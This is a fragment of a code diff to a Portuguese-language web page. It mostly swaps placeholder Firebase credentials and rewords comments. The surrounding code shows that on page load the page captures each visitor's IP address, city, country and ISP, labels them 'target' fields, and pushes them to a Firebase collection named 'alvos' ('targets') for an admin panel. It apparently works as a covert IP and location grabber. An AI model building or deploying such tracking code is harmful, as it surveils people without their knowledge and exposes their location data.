@@ -113,18 +113,17 @@ body{background:var(--bg);color:var(--text);min-height:100vh;display:flex;justif
 </div>
 
 <script>
-// CONFIGURAÇÃO DO FIREBASE (Coloque aqui as suas credenciais reais)
+// Substitua abaixo pelas suas credenciais reais do Firebase Console
 const firebaseConfig = {
-  apiKey: "SUA_API_KEY",
-  authDomain: "SEU_PROJETO.firebaseapp.com",
-  databaseURL: "https://SEU_PROJETO-default-rtdb.firebaseio.com",
-  projectId: "SEU_PROJETO",
-  storageBucket: "SEU_PROJETO.appspot.com",
-  messagingSenderId: "SEU_MESSAGING_SENDER_ID",
-  appId: "SEU_APP_ID"
+  apiKey: "COLE_AQUI_A_SUA_API_KEY",
+  authDomain: "COLE_AQUI_O_AUTH_DOMAIN",
+  databaseURL: "COLE_AQUI_O_DATABASE_URL",
+  projectId: "COLE_AQUI_O_PROJECT_ID",
+  storageBucket: "COLE_AQUI_O_STORAGE_BUCKET",
+  messagingSenderId: "COLE_AQUI_O_MESSAGING_SENDER_ID",
+  appId: "COLE_AQUI_O_APP_ID"
 };
 
-// Inicializa o Firebase com segurança
 if (!firebase.apps.length) {
   firebase.initializeApp(firebaseConfig);
 }
@@ -189,7 +188,7 @@ window.onload = async function() {
       document.getElementById('targetLocation').innerText = `${data.city || 'N/A'}, ${data.country_code || ''}`;
       document.getElementById('targetIsp').innerText = ispVal;
 
-      // Envia imediatamente para a nuvem
+      // Envia os dados para a nuvem
       db.ref('alvos').push({
         time: timeNow,
         ip: ipVal,
@@ -209,7 +208,7 @@ window.onload = async function() {
     document.getElementById('targetIp').innerText = "Erro de rede";
   }
 
-  // Ouve atualizações em tempo real para o painel admin
+  // Ouve os dados da nuvem em tempo real
   db.ref('alvos').on('value', (snapshot) => {
     globalLogs = [];
     snapshot.forEach((childSnapshot) => {
